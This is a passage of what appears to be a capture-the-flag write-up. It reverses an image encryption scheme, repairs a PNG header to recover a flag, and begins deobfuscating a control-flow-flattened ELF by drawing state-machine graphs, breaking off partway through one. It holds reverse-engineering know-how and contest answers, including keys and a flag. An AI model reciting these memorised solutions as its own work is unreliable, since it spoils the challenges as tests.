k <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x10\x82</span><span style="color:#e6db74">u</span><span style="color:#ae81ff">\x98</span><span style="color:#e6db74">:</span><span style="color:#ae81ff">\x1c\x0f</span><span style="color:#e6db74">y</span><span style="color:#ae81ff">\x10</span><span style="color:#e6db74">/4{</span><span style="color:#ae81ff">\xd8\xc3\xa9</span><span style="color:#e6db74">u</span><span style="color:#ae81ff">\xe3</span><span style="color:#e6db74">x</span><span style="color:#ae81ff">\x8a\x9d</span><span style="color:#e6db74">3ru</span><span style="color:#ae81ff">\xc1\x93\xf5</span><span style="color:#e6db74">i</span><span style="color:#ae81ff">\x8c</span><span style="color:#e6db74">6</span><span style="color:#ae81ff">\xdf\x15\x01</span><span style="color:#e6db74">&#39;</span>
iv <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xbb\x9c\xe2\x8d\xd0\xd1\xbe</span><span style="color:#e6db74">@</span><span style="color:#ae81ff">\xf6</span><span style="color:#e6db74">l</span><span style="color:#ae81ff">\x02\xc9</span><span style="color:#e6db74">5</span><span style="color:#ae81ff">\x15\x1c</span><span style="color:#e6db74">F&#39;</span>
aes <span style="color:#f92672">=</span> AES<span style="color:#f92672">.</span>new(k, AES<span style="color:#f92672">.</span>MODE_CBC, iv)
fmok_bytes <span style="color:#f92672">=</span> aes<span style="color:#f92672">.</span>decrypt(ffmok_bytes[:<span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>]) <span style="color:#f92672">+</span> ffmok_bytes[<span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>:]
fmok_pixels <span style="color:#f92672">=</span> [[fmok_bytes[i<span style="color:#f92672">+</span>j] <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">8</span>) <span style="color:#66d9ef">if</span> i <span style="color:#f92672">+</span> j <span style="color:#f92672">&lt;</span> len(fmok_bytes)] <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, len(fmok_bytes), <span style="color:#ae81ff">8</span>)]</code></pre></div>
<p>Notice that k is the &quot;iv (in big endian) raised to the 4th power (i.e. squared twice)&quot; in little endian.</p>

<p>Therefore, the iv can be recovered by:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">iv <span style="color:#f92672">=</span> tuple(long_to_bytes(int(isqrt(isqrt(int<span style="color:#f92672">.</span>from_bytes(k, <span style="color:#e6db74">&#39;little&#39;</span>))))))
<span style="color:#75715e"># iv = tuple(b&#34;ASDFQWER&#34;)</span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Source</span>
iv <span style="color:#f92672">=</span> (X, X, X, X, X, X, X, X) <span style="color:#75715e"># Of course it&#39;s REDACTED</span>
prev <span style="color:#f92672">=</span> iv
fmok_pixels <span style="color:#f92672">=</span> []

<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, len(mok_bytes), <span style="color:#ae81ff">8</span>):
    prev <span style="color:#f92672">=</span> tuple(map(<span style="color:#66d9ef">lambda</span> x, y: x <span style="color:#f92672">^</span> y, mok_bytes[i:i<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>], prev))
    fmok_pixels<span style="color:#f92672">.</span>append(prev)

<span style="color:#75715e"># Reverse</span>
iv <span style="color:#f92672">=</span> tuple(long_to_bytes(int(isqrt(isqrt(int<span style="color:#f92672">.</span>from_bytes(k, <span style="color:#e6db74">&#39;little&#39;</span>))))))
prev <span style="color:#f92672">=</span> iv
mok_bytes <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> fmok_pixels:
    appending <span style="color:#f92672">=</span> bytes(map(<span style="color:#66d9ef">lambda</span> x, y: x <span style="color:#f92672">^</span> y, i, prev))
    <span style="color:#75715e"># assert tuple(map(lambda x, y: x ^ y, appending, prev)) == tuple(i)</span>
    mok_bytes <span style="color:#f92672">+=</span> appending
    prev <span style="color:#f92672">=</span> tuple(i)</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Source</span>
mok <span style="color:#f92672">=</span> Image<span style="color:#f92672">.</span>open(<span style="color:#e6db74">&#34;el_mok.png&#34;</span>)
mok_bytes <span style="color:#f92672">=</span> mok<span style="color:#f92672">.</span>tobytes()

<span style="color:#75715e"># Reverse</span>
mok <span style="color:#f92672">=</span> Image<span style="color:#f92672">.</span>frombytes(<span style="color:#e6db74">&#39;RGBA&#39;</span>, (<span style="color:#ae81ff">887</span>,<span style="color:#ae81ff">499</span>), mok_bytes, <span style="color:#e6db74">&#39;raw&#39;</span>)
mok<span style="color:#f92672">.</span>save(<span style="color:#e6db74">&#34;el_mok.png&#34;</span>)</code></pre></div>
<p>We actually cannot figure out the dimensions of <code>el_mok.png</code> from the source code. But considering the source code looks like encryption, and both $887$ and $499$ are primes, we can first assume that <code>el_mok.png</code> is also $887\times499$ unless we find the resulting image misaligned.</p>

<p>We can test the reversed source code for the fixed(?) <code>brain_memory.png</code>, leaving all the unseen part as black or any color. (Due to the action of per-block xor-mod and the property of CBC block cipher decryption mode, the unknown bytes should not propagate beyond the neighbouring blocks.)</p>

<p><figure><img src="/images/2021-05-22-3kctf/mm-1.png" alt=""></figure></p>

<p>We can already notice a man in the middle of this image, but since most parts are unknown, maybe the sources have already provided enough details but something is hidden?</p>

<h3 id="part-iii-finding-out-the-culprit">Part III. Finding out the Culprit<a hidden class="anchor" aria-hidden="true" href="#part-iii-finding-out-the-culprit">#</a></h3>

<div class="alert success">
  <strong>Summary.</strong> This <code>png</code> file exported has much smaller size (About 76 KB) than the original file (About 1.7 MB), and $\frac{1.7 \text{MB}}{76 \text{KB}} \approx \frac{499}{22}$, maybe we can confirm something &hellip;?
</div>
  

<p>Yes, all the pixels ($887\times499$) are actually included in <code>brain_memory.png</code>, the only problem is that the dimension is not probably set (modified in some ways).</p>

<p>By checking the W3 specification<sup class="footnote-ref" id="fnref:w3-spec"><a class="footnote" href="#fn:w3-spec">2</a></sup> of PNG file, we can know that the height is the 5th to the 8th bytes after the start of <code>IHDR</code> chunk. (The 1st to the 4th bytes are the width)</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">00000000: 8950 4e47 0d0a 1a0a 0000 000d 4948 4452  .PNG........IHDR
00000010: 0000 0377[0000 0016]0806 0000 0063 7365  ...w.........cse</code></pre></div>
<p>So we directly modify <code>00000016 (22)</code> to <code>000001f3 (499)</code> to see if it works.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">MSPaint: Success
SAI2: Internal Error
GIMP: Error
paint.net: Success</code></pre></div>
<p>So we can just use <code>paint.net</code> to fix the remaining parts by exporting the image rendered by it.</p>

<h3 id="part-iv-completing-the-source-code">Part IV. Completing the Source Code<a hidden class="anchor" aria-hidden="true" href="#part-iv-completing-the-source-code">#</a></h3>

<p>Here we try our reversed program to the &quot;fixed image&quot;:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> PIL <span style="color:#f92672">import</span> Image
<span style="color:#f92672">from</span> Crypto.Util.number <span style="color:#f92672">import</span> bytes_to_long, long_to_bytes
<span style="color:#f92672">from</span> Crypto.Util.Padding <span style="color:#f92672">import</span> pad, unpad
<span style="color:#f92672">from</span> gmpy2 <span style="color:#f92672">import</span> isqrt
<span style="color:#f92672">from</span> Crypto.Cipher <span style="color:#f92672">import</span> AES

<span style="color:#75715e"># for the first attempt to recover using the 887 x 22 image</span>
<span style="color:#75715e"># fffmok = Image.open(&#34;brain_memory.png&#34;)</span>
<span style="color:#75715e">#</span>
<span style="color:#75715e"># fffmok_pixels_rev = []</span>
<span style="color:#75715e"># for y in range(887):</span>
<span style="color:#75715e">#     for x in range(499):</span>
<span style="color:#75715e">#         fffmok_pixels_rev.append(fffmok.getpixel((y, x)) if x &lt; 22 else #(0,0,0,0))</span>

fffmok <span style="color:#f92672">=</span> Image<span style="color:#f92672">.</span>open(<span style="color:#e6db74">&#34;brain_memory.png&#34;</span>)

fffmok_pixels_rev <span style="color:#f92672">=</span> []
<span style="color:#66d9ef">for</span> y <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">887</span>):
    <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">499</span>):
        fffmok_pixels_rev<span style="color:#f92672">.</span>append(fffmok<span style="color:#f92672">.</span>getpixel((y, x)))
        
key <span style="color:#f92672">=</span> bytes_to_long(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;_D3f1nItEly_giV3_IT_@_Sh0T_th1s_Is_n0T_4rT_BuT_th3_3aRt_0f_m3kD4d_sH1Li_&#34;</span>)
key_mask_length <span style="color:#f92672">=</span> (<span style="color:#ae81ff">18446744073709551615</span>)<span style="color:#f92672">.</span>bit_length()
key_low64 <span style="color:#f92672">=</span> key <span style="color:#f92672">&amp;</span> (<span style="color:#ae81ff">2</span> <span style="color:#f92672">**</span> key_mask_length <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)
key_mask64 <span style="color:#f92672">=</span> key <span style="color:#f92672">^</span> key_low64

ffmok_bytes_rev <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, len(fffmok_pixels_rev) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">2</span>):
    r1, g1, b1, o1 <span style="color:#f92672">=</span> fffmok_pixels_rev[i]
    r2, g2, b2, o2 <span style="color:#f92672">=</span> fffmok_pixels_rev[i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>]
    v <span style="color:#f92672">=</span> bytes_to_long(bytes([r1, g1, b1, o1, r2, g2, b2, o2]))
    p <span style="color:#f92672">=</span> ((key_mask64 <span style="color:#f92672">-</span> (key_mask64 <span style="color:#f92672">-</span> v) <span style="color:#f92672">%</span> <span style="color:#ae81ff">18446744073709551615</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">18446744073709551615</span>) <span style="color:#f92672">^</span> key
    <span style="color:#75715e"># assert (p ^ key) % 18446744073709551615 == v</span>
    ffmok_bytes_rev <span style="color:#f92672">+=</span> p<span style="color:#f92672">.</span>to_bytes(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">&#34;big&#34;</span>)

ffmok_bytes_rev <span style="color:#f92672">+=</span> bytes(fffmok_pixels_rev[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>])

k <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x10\x82</span><span style="color:#e6db74">u</span><span style="color:#ae81ff">\x98</span><span style="color:#e6db74">:</span><span style="color:#ae81ff">\x1c\x0f</span><span style="color:#e6db74">y</span><span style="color:#ae81ff">\x10</span><span style="color:#e6db74">/4{</span><span style="color:#ae81ff">\xd8\xc3\xa9</span><span style="color:#e6db74">u</span><span style="color:#ae81ff">\xe3</span><span style="color:#e6db74">x</span><span style="color:#ae81ff">\x8a\x9d</span><span style="color:#e6db74">3ru</span><span style="color:#ae81ff">\xc1\x93\xf5</span><span style="color:#e6db74">i</span><span style="color:#ae81ff">\x8c</span><span style="color:#e6db74">6</span><span style="color:#ae81ff">\xdf\x15\x01</span><span style="color:#e6db74">&#39;</span>
iv <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xbb\x9c\xe2\x8d\xd0\xd1\xbe</span><span style="color:#e6db74">@</span><span style="color:#ae81ff">\xf6</span><span style="color:#e6db74">l</span><span style="color:#ae81ff">\x02\xc9</span><span style="color:#e6db74">5</span><span style="color:#ae81ff">\x15\x1c</span><span style="color:#e6db74">F&#39;</span>
aes <span style="color:#f92672">=</span> AES<span style="color:#f92672">.</span>new(k, AES<span style="color:#f92672">.</span>MODE_CBC, iv)
fmok_bytes_rev <span style="color:#f92672">=</span> aes<span style="color:#f92672">.</span>decrypt(ffmok_bytes_rev[:<span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>]) <span style="color:#f92672">+</span> ffmok_bytes_rev[<span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>:]
fmok_pixels_rev <span style="color:#f92672">=</span> [[fmok_bytes_rev[i<span style="color:#f92672">+</span>j] <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">8</span>) <span style="color:#66d9ef">if</span> i <span style="color:#f92672">+</span> j <span style="color:#f92672">&lt;</span> len(fmok_bytes_rev)] <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, len(fmok_bytes_rev), <span style="color:#ae81ff">8</span>)]
<span style="color:#75715e"># iv = tuple(b&#34;ASDFQWER&#34;)</span>
iv <span style="color:#f92672">=</span> tuple(long_to_bytes(int(isqrt(isqrt(int<span style="color:#f92672">.</span>from_bytes(k, <span style="color:#e6db74">&#39;little&#39;</span>))))))
prev <span style="color:#f92672">=</span> iv
mok_bytes_rev <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> fmok_pixels_rev:
    prev0 <span style="color:#f92672">=</span> [_ <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> prev]
    appending <span style="color:#f92672">=</span> bytes(map(<span style="color:#66d9ef">lambda</span> x, y: x <span style="color:#f92672">^</span> y, i, prev))
    <span style="color:#75715e"># assert tuple(map(lambda x, y: x ^ y, appending, prev0)) == tuple(i)</span>
    mok_bytes_rev <span style="color:#f92672">+=</span> appending
    prev <span style="color:#f92672">=</span> tuple(i)

mok <span style="color:#f92672">=</span> Image<span style="color:#f92672">.</span>frombytes(<span style="color:#e6db74">&#39;RGBA&#39;</span>, (<span style="color:#ae81ff">887</span>,<span style="color:#ae81ff">499</span>), mok_bytes_rev, <span style="color:#e6db74">&#39;raw&#39;</span>)
mok<span style="color:#f92672">.</span>save(<span style="color:#e6db74">&#34;el_mok.png&#34;</span>)
<span style="color:#75715e"># open(&#34;el_mok.data&#34;, &#34;wb&#34;).write(mok_bytes_rev) if unsure about the dimension</span></code></pre></div>
<h3 id="part-v-the-memories-recovered">Part V. The Memories Recovered<a hidden class="anchor" aria-hidden="true" href="#part-v-the-memories-recovered">#</a></h3>

<p><figure><img src="/images/2021-05-22-3kctf/mm-2.png" alt=""></figure></p>

<p>Therefore, the flag is <code>3k{I_Am_50_pR3t7y_W1tH_My_H4IR}</code>.</p>

<h2 id="layers-reverse-488-points">Layers (Reverse; 488 points)<a hidden class="anchor" aria-hidden="true" href="#layers-reverse-488-points">#</a></h2>

<p>Solved by <em>Mystiz</em> and <em>cdemirer</em>.</p>

<div class="alert info">
  <strong>Note.</strong> This is written based on their first revision of the code. They have released a new revision which has a different offset.
</div>
  

<p>We are given a 64-bit ELF called <code>layers</code> in the challenge. The functions are obfuscated so that the logic is not trivial to read. For instance, <code>sub_400E40</code> is one of relatively simpler function:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">__int64</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">sub_400E40</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>a1)
{
  size_t v1; <span style="color:#75715e">// rax
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">signed</span> <span style="color:#66d9ef">int</span> v2; <span style="color:#75715e">// ecx
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">signed</span> <span style="color:#66d9ef">int</span> v4; <span style="color:#75715e">// [rsp+2Ch] [rbp-14h]
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v5; <span style="color:#75715e">// [rsp+30h] [rbp-10h]
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> v6; <span style="color:#75715e">// [rsp+34h] [rbp-Ch]
</span><span style="color:#75715e"></span>
  v6 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
  v5 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
  v4 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1EB0722D</span>;
  <span style="color:#66d9ef">while</span> ( v4 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x87679F00</span> )
  {
    <span style="color:#66d9ef">switch</span> ( v4 )
    {
      <span style="color:#66d9ef">case</span> (<span style="color:#66d9ef">int</span>)<span style="color:#ae81ff">0x9415E80F</span><span style="color:#f92672">:</span>
        <span style="color:#f92672">++</span>v5;
        v4 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1EB0722D</span>;
        <span style="color:#66d9ef">break</span>;
      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0x12F4C285</span><span style="color:#f92672">:</span>
        v6 <span style="color:#f92672">+=</span> a1[v5];
        v4 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x9415E80F</span>;
        <span style="color:#66d9ef">break</span>;
      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0x1EB0722D</span><span style="color:#f92672">:</span>
        v1 <span style="color:#f92672">=</span> strlen(a1);
        v2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x87679F00</span>;
        <span style="color:#66d9ef">if</span> ( v5 <span style="color:#f92672">&lt;</span> v1 )
          v2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x12F4C285</span>;
        v4 <span style="color:#f92672">=</span> v2;
        <span style="color:#66d9ef">break</span>;
    }
  }
  <span style="color:#66d9ef">return</span> v6;
}</code></pre></div>
<h3 id="part-i-drawing-state-machines">Part I. Drawing State Machines<a hidden class="anchor" aria-hidden="true" href="#part-i-drawing-state-machines">#</a></h3>

<p>For <code>sub_400E40</code> we mentioned above, we can see that the code to be executed is determined by <code>v4</code>. For instance, when <code>v4 = 0x1EB0722D</code>, then <code>v1 = strlen(a1)</code> and will jump to <code>0x12F4C285</code> if <code>v5 &lt; v1</code>, or otherwise <code>0x87679F00</code>. I think this is pretty similar to a state machine (where <code>v4</code> is the state), hence I started to draw the figures. Let's see <code>sub_400E40</code> visually:</p>
<pre tabindex="0"><code class="language-viz-dot" data-lang="viz-dot">digraph {
node [shape=&#34;box&#34;];

&#34;BEGIN&#34; -&gt; &#34;0x1EB0722D&#34;

&#34;0x87679F00&#34;[label=&#34;END&#34;]

&#34;0x9415E80F&#34;[label=&#34;++v5&#34;]
&#34;0x9415E80F&#34;-&gt;&#34;0x1EB0722D&#34;

&#34;0x12F4C285&#34;[label=&#34;v6 += a1[v5]&#34;]
&#34;0x12F4C285&#34;-&gt;&#34;0x9415E80F&#34;

&#34;0x1EB0722D&#34;[label=&#34;v1 = strlen(a1)&#34;]
&#34;0x1EB0722D&#34;-&gt;&#34;0x12F4C285&#34;[label=&#34;v5 &lt; v1&#34;]
&#34;0x1EB0722D&#34;-&gt;&#34;0x87679F00&#34;[style=&#34;dashed&#34;]
}</code></pre>
<p>Since <code>v6</code> is the returning variable, we can see that the function is computing the sum of ASCII values, i.e., <code>a1[0] + a1[1] + ...</code></p>

<p>In the similar fashion, I manually built the graphs for <code>main</code> and some of the functions called by <code>main</code>. Here are some of them:</p>

<h4 id="main"><code>main</code><a hidden class="anchor" aria-hidden="true" href="#main">#</a></h4>
<pre tabindex="0"><code class="language-viz-dot" data-lang="viz-dot">digraph {
node [shape=&#34;box&#34;];

&#34;BEGIN&#34;[fillcolor=&#34;lightblue&#34;, style=&#34;filled&#34;]
&#34;BEGIN&#34; -&gt; &#34;0x7F83FB5&#34;

&#34;0x8130ED43&#34;[label=&#34;memset c2, k2, m2\nj1 = 0&#34;]
&#34;0x8130ED43&#34;-&gt;&#34;0x93689926&#34;

&#34;0x84A7F436&#34;[label=&#34;j2 = 0&#34;]
&#34;0x84A7F436&#34;-&gt;&#34;0x325B57D6&#34;

&#34;0x8F6AECCF&#34;[label=&#34;k2[j1] = rand()&#34;]
&#34;0x8F6AECCF&#34;-&gt;&#34;0xCEDBC306&#34;

&#34;0x93689926&#34;[shape=&#34;point&#34;]
&#34;0x93689926&#34;-&gt;&#34;0x8F6AECCF&#34;[label=&#34;j1 &lt; 16&#34;]
&#34;0x93689926&#34;-&gt;&#34;0x84A7F436&#34;[style=&#34;dashed&#34;]

&#34;0x9E00E14A&#34;[label=&#34;++j4&#34;]
&#34;0x9E00E14A&#34;-&gt;&#34;0x379D135E&#34;

&#34;0xA026F981&#34;[label=&#34;++j5&#34;]
&#34;0xA026F981&#34;-&gt;&#34;0xB9048286&#34;

&#34;0xAD9286F4&#34;[label=&#34;memset(tmp, 0, 32)\nsub_403EC0(flag[16*j3], key, tmp, 32)\nj4 = 0&#34;]
&#34;0xAD9286F4&#34;-&gt;&#34;0x379D135E&#34;

&#34;0xAE672971&#34;[label=&#34;*flag_tail=0&#34;]
&#34;0xAE672971&#34;-&gt;&#34;0xF8F2B980&#34;

&#34;0xB9048286&#34;[shape=&#34;point&#34;]
&#34;0xB9048286&#34;-&gt;&#34;0x13F8F8B8&#34;[label=&#34;j5 &lt; 32&#34;]
&#34;0xB9048286&#34;-&gt;&#34;0xF436E04E&#34;[style=&#34;dashed&#34;]

&#34;0xBD66D1C0&#34;[label=&#34;v33[16 * j3 + j4] = tmp[j4]&#34;]
&#34;0xBD66D1C0&#34;-&gt;&#34;0x9E00E14A&#34;

&#34;0xCBD7742F&#34;[label=&#34;++j2&#34;]
&#34;0xCBD7742F&#34;-&gt;&#34;0x325B57D6&#34;

&#34;0xCEDBC306&#34;[label=&#34;++j1&#34;]
&#34;0xCEDBC306&#34;-&gt;&#34;0x93689926&#34;

&#34;0xDA5A3C78&#34;[label=&#34;++j6&#34;]
&#34;0xDA5A3C78&#34;-&gt;&#34;0x28B41C13&#34;

&#34;0xE3A80132&#34;[shape=&#34;point&#34;]
&#34;0xE3A80132&#34;-&gt;&#34;0x263F9E70&#34;

&#34;0xEB90905D&#34;[label=&#34;++i&#34;]
&#34;0xEB90905D&#34;-&gt;&#34;0x6C6E9FB7&#34;

&#34;0xEE3FA927&#34;[label=&#34;sprintf(flag, \&#34;%s%c\&#34;, flag, pad)&#34;]
&#34;0xEE3FA927&#34;-&gt;&#34;0xDA5A3C78&#34;

&#34;0xF2CAB7B8&#34;[label=&#34;seed = sub_400E40(flag)\nsrand(seed)\nj5 = 0&#34;]
&#34;0xF2CAB7B8&#34;-&gt;&#34;0xB9048286&#34;

&#34;0xF436E04E&#34;[label=&#34;ptr = malloc(0x20uLL)\npad = 16 - (strlen(flag) &amp; 0xF)\nj6 = 0&#34;]
&#34;0xF436E04E&#34;-&gt;&#34;0x28B41C13&#34;

&#34;0xF8F2B980&#34;[shape=&#34;point&#34;]
&#34;0xF8F2B980&#34;-&gt;&#34;0x4119DFE7&#34;[label=&#34;strlen(flag) &gt; 0x28&#34;]
&#34;0xF8F2B980&#34;-&gt;&#34;0xF2CAB7B8&#34;[style=&#34;dashed&#34;]

&#34;0x7F83FB5&#34;[shape=&#34;point&#34;]
&#34;0x7F83FB5&#34;-&gt;&#34;0xAE672971&#34;[label=&#34;v39&#34;]
&#34;0x7F83FB5&#34;-&gt;&#34;0xF8F2B980&#34;[style=&#34;dashed&#34;]

&#34;0x1238A7CD&#34;[label=&#34;j3_ = j3;\nflen = strlen(flag)&#34;]
&#34;0x1238A7CD&#34;-&gt;&#34;0xAD9286F4&#34;[label=&#34;j3_ &lt; flen&gt;&gt;4&#34;]
&#34;0x1238A7CD&#34;-&gt;&#34;0x8130ED43&#34;[style=&#34;dashed&#34;]

&#34;0x13F8F8B8&#34;[label=&#34;key[j5] = rand()&#34;]
&#34;0x13F8F8B8&#34;-&gt;&#34;0xA026F981&#34;

&#34;0x140AF898&#34;[label=&#34;memset(m2, 0, 8uLL);\n__isoc99_sscanf(&amp;v33[8 * j2], \&#34;%8s\&#34;, m2)\nsub_4008F0(m2, k2)\nsprintf(c2, \&#34;%s%s\&#34;, c2, m2)&#34;]
&#34;0x140AF898&#34;-&gt;&#34;0xCBD7742F&#34;

&#34;0x15223C70&#34;[label=&#34;END&#34;]

&#34;0x263F9E70&#34;[label=&#34;++j3&#34;]
&#34;0x263F9E70&#34;-&gt;&#34;0x1238A7CD&#34;

&#34;0x28B41C13&#34;[shape=&#34;point&#34;]
&#34;0x28B41C13&#34;-&gt;&#34;0xEE3FA927&#34;[label=&#34;j6 &lt; pad&#34;]
&#34;0x28B41C13&#34;-&gt;&#34;0x68B9F247&#34;[style=&#34;dashed&#34;]

&#34;0x325B57D6&#34;[label=&#34;v13 = strlen(v33)&#34;]
&#34;0x325B57D6&#34;-&gt;&#34;0x140AF898&#34;[label=&#34;j2 &lt; v13 &gt;&gt; 3&#34;]
&#34;0x325B57D6&#34;-&gt;&#34;0x41DBA672&#34;[style=&#34;dashed&#34;]

&#34;0x36B7A523&#34;[label=&#34;fn_key ^= TARGET_C[i] ^ c2[i]&#34;]
&#34;0x36B7A523&#34;-&gt;&#34;0xEB90905D&#34;

&#34;0x379D135E&#34;[shape=&#34;point&#34;]
&#34;0x379D135E&#34;-&gt;&#34;0xBD66D1C0&#34;[label=&#34;j4 &lt; 16&#34;]
&#34;0x379D135E&#34;-&gt;&#34;0xE3A80132&#34;[style=&#34;dashed&#34;]

&#34;0x4119DFE7&#34;[label=&#34;FAIL&#34;]

&#34;0x41DBA672&#34;[label=&#34;i = 0&#34;]
&#34;0x41DBA672&#34; -&gt; &#34;0x6C6E9FB7&#34;

&#34;0x68B9F247&#34;[label=&#34;j3 = 0&#34;]
&#34;0x68B9F247&#34; -&gt; &#34;0x1238A7CD&#34;

&#34;0x6C6E9FB7&#34;[shape=&#34;point&#34;]
&#34;0x6C6E9FB7&#34; -&gt; &#34;0x36B7A523&#34;[label=&#34;i &lt; 48&#34;]
&#34;0x6C6E9FB7&#34; -&gt; &#34;0x15223C70&#34;[style=&#34;dashed&#34;]
}</code></pre>
<h4 id="sub403ec0"><code>sub_403EC0</code><a hidden class="anchor" aria-hidden="true" href="#sub403ec0">#</a></h4>
<pre tabindex="0"><code class="language-viz-dot" data-lang="viz-dot">digraph {
node [shape=&#34;box&#34;];

&#34;BEGIN&#34;[fillcolor=&#34;lightblue&#34;, style=&#34;filled&#34;]
&#34;sub_403090&#34;[fillcolor=&#34;yellow&#34;, style=&#34;filled&#34;]
&#34;BEGIN&#34; -&gt; &#34;sub_403090&#34;
&#34;sub_403090&#34; -&gt; &#34;0xC69A2A67&#34;

&#34;0xA57D3848&#34;[fillcolor=&#34;lightblue&#34;, style=&#34;filled&#34;]
&#34;0xA57D3848&#34; -&gt; &#34;0xA5AA2438&#34;

&#34;0xA5AA2438&#34;[label=&#34;++i&#34;]
&#34;0xA5AA2438&#34; -&gt; &#34;0x39ABA8E6&#34;

&#34;0xBD3CC7E5&#34;[label=&#34;j = 0&#34;]
&#34;0xBD3CC7E5&#34; -&gt; &#34;0xF100B3F1&#34;

&#34;0xC69A2A67&#34;[shape=&#34;point&#34;]
&#34;0xC69A2A67&#34; -&gt; &#34;0xBD3CC7E5&#34;[label=&#34;k &lt; 32&#34;]
&#34;0xC69A2A67&#34; -&gt; &#34;0x6968BCED&#34;[style=&#34;dashed&#34;]

&#34;0xCF365A10&#34;[shape=&#34;point&#34;]
&#34;0xCF365A10&#34; -&gt; &#34;0x120F462B&#34;

&#34;0xF100B3F1&#34;[shape=&#34;point&#34;]
&#34;0xF100B3F1&#34; -&gt; &#34;0x510340B5&#34;[label=&#34;j &lt; 4&#34;]
&#34;0xF100B3F1&#34; -&gt; &#34;0x5E778DDD&#34;[style=&#34;dashed&#34;]

&#34;0xFCEC94E4&#34;[label=&#34;message[0] ^= s[128] ^ 0x734CA101\nmessage[1] ^= s[129]\nmessage[2] ^= s[130]\nmessage[3] ^= s[131] ^ 0xA9BDC3C0&#34;]
&#34;0xFCEC94E4&#34; -&gt; &#34;0xCF365A10&#34;

&#34;0x120F462B&#34;[label=&#34;++k&#34;]
&#34;0x120F462B&#34; -&gt; &#34;0xC69A2A67&#34;

&#34;0x2E78E25C&#34;[shape=&#34;point&#34;]
&#34;0x2E78E25C&#34; -&gt; &#34;0x45DFAE8F&#34;[label=&#34;k &lt; 31&#34;]
&#34;0x2E78E25C&#34; -&gt; &#34;0xFCEC94E4&#34;[style=&#34;dashed&#34;]

&#34;0x39ABA8E6&#34;[shape=&#34;point&#34;]
&#34;0x39ABA8E6&#34; -&gt; &#34;0xA57D3848&#34;[label=&#34;i &lt; 32&#34;]
&#34;0x39ABA8E6&#34; -&gt; &#34;0x2E78E25C&#34;[style=&#34;dashed&#34;]

